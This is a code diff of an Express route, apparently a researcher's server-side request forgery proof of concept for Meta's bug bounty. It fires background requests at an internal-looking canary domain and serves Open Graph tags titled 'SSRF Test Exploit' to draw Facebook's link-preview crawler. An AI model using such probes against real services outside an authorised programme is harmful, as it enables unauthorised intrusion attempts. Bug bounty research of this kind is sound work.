@@ -7,14 +7,28 @@ app.get('/', async (req, res) => {
     const canaryUrl = 'https://internalfb.com';
     
     try {
-        // محاولة 1: إرسال طلب GET في الخلفية
+        // إرسال طلبات الخلفية للكناري (GET & POST) لضمان التسجيل
         axios.get(canaryUrl, { timeout: 3000 }).catch(() => {});
-        
-        // محاولة 2: إرسال طلب POST في الخلفية (وهو المطلوب غالباً في ثغرات Meta)
         axios.post(canaryUrl, {}, { timeout: 3000 }).catch(() => {});
         
-        // إرجاع استجابة ناجحة لفيسبوك
-        res.status(200).send('<html><head><title>Meta Bug Bounty PoC</title></head><body><h1>Success</h1></body></html>');
+        // بناء صفحة HTML تحتوي على وسوم og:image و og:title المطلوبة من فيسبوك
+        const htmlResponse = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Meta Bug Bounty PoC</title>
+            <meta property="og:title" content="SSRF Test Exploit" />
+            <meta property="og:description" content="Testing Meta Server-Side Requests" />
+            <meta property="og:image" content="https://google.com" />
+            <meta property="og:url" content="https://onrender.com" />
+        </head>
+        <body>
+            <h1>Success 200 OK</h1>
+        </body>
+        </html>
+        `;
+        
+        res.status(200).send(htmlResponse);
     } catch (error) {
         res.status(200).send('Success');
     }
